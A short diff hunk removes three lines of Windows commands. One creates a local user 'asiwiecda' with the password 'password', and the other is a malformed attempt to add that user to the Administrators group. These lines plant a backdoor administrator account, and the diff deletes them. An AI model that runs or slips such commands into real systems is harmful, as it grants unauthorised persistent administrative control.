@@ -1,3 +1,0 @@
-net user asiwiecda password /add
-
-net user localgroup Administrators asiwiecda /add
